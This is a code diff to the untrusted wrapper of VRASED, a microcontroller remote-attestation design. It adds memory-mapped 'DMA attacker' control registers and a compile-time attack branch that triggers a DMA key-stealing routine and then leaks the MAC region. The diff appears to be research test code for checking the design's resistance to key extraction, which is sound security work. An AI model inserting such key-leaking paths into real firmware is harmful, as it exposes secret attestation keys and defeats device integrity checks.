@@ -44,7 +44,18 @@ __attribute__ ((section (".do_mac.leave"))) __attribute__((naked)) void Hacl_HMA
 }
 
 /*********** UNTRUSTED VRASED WRAPPER CODE (outside SW-Att) ***********/
+
 #include <stdio.h>
+#include "hardware.h"
+
+#define DMA_ATTACKER_STEAL_KEY          0x0070
+#define DMA_ATTACKER_PERSISTENT_FLAG    0x0072
+#define DMA_ATTACKER_MEASURE            0x0074
+#define DMA_ATTACKER_ACTIVE             0x0076
+
+// stringify macro parameter a
+#define __s__(a)                        #a
+#define _s_(a)                          __s__(a)
 
 void my_memset(uint8_t* ptr, int len, uint8_t val) {
   int i=0;
@@ -70,6 +81,24 @@ void VRASED (uint8_t *challenge, uint8_t *response) {
 
     #if __ATTACK == 1
       leak_key((uint8_t*) KEY_ADDR, 31, 64);
+      return;
+    #endif
+
+    #if __ATTACK == 2
+      __asm__ volatile(
+          "mov #1, &" _s_(DMA_ATTACKER_STEAL_KEY) "\n"
+          ".REPT 64 \n"
+          "nop \n"
+          ".ENDR \n"
+          "nop \n"
+          "nop \n"
+          "nop \n"
+          "nop \n"
+          "nop \n"
+          "nop \n"
+          "nop \n"
+      );
+      leak_key((uint8_t*) MAC_ADDR, 0, 64);
       return;
     #endif
 
